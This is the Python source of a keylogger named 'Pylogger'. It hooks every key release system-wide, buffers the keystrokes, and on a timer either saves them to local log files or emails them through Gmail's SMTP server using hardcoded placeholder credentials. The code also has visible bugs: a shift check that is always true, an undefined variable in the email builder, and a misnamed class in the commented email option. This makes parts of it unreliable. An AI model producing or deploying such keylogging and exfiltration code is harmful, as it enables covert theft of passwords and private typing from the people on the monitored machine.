import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


SEND_REPORT_EVERY = 10 # Time in seconds
EMAIL_ADDRESS = "example@outlook.com" # Email address to send the report to
EMAIL_PASSWORD = "!examplepass!" # Password of the email address

class Pylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # If it's a special character, then just replace it with its name
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "[BACKSPACE]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "esc":
                name = "[ESC]"
            elif name == "shift_r" or "r_shift" or "left_shift" or "shift":
                name = ""
            elif event.event_type == "down":
                name = name.upper()
            else:
                # Replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        self.end_dt = datetime.now()
        # Update the filename with start and end date and time
        self.filename = f"keylog_{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}_{self.end_dt.strftime('%Y-%m-%d_%H-%M-%S')}"

    def report_to_file(self):
        # Save the log file to the folder Local_logs
        with open(f"Local_logs/{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved report: {self.filename}")


    def prepare_email(self, message):
        msg = MIMEMultipart("alternative")
        msg["from"] = EMAIL_ADDRESS
        msg["to"] = EMAIL_ADDRESS
        msg["subject"] = f"Pylogger Report ({self.start_dt.strftime('%Y-%m-%d %H:%M:%S')})"
        html = f"<p>{message}</p>"
        text_part = MIMEText(text, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()


    def sendmail(self, email, password, message, verbose=1):
        # Connect to the SMTP server as TLS mode (default) and send email
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()

        # Login to the email account
        server.login(email, password)
        
        # Send the email
        server.sendmail(email, email, message)

        server.quit()

        if verbose:
            print(f"date: {datetime.now()} - Sent report to {email} containing {message}")

    def report(self):
        # Check if there is a log file, if so, report it. After reporting, delete the log file.
        if self.log:
            # If there is a log, report it
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                # Send the log file in an email
                message = self.prepare_email(self.log)
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                # Save the log file
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        
        # Set the daemon to true so the thread will die when the main thread is dead
        timer.daemon = True

        # Start the timer
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        # Start the Pylogger
        keyboard.on_release(callback=self.callback)

        # Report to the Pylogger
        self.report()

        print(f"{datetime.now()} - Started Pylogger")

        # Block the current thread, wait for the user to press a key
        keyboard.wait()

if __name__ == "__main__":
    # If you want to report to email use this
    # pylogger = PyLogger(interval=SEND_REPORT_EVERY, report_method="email")
    # pylogger.start()

    # If you want to report to a file use this
    pylogger = Pylogger(interval=SEND_REPORT_EVERY, report_method="file")
    pylogger.start()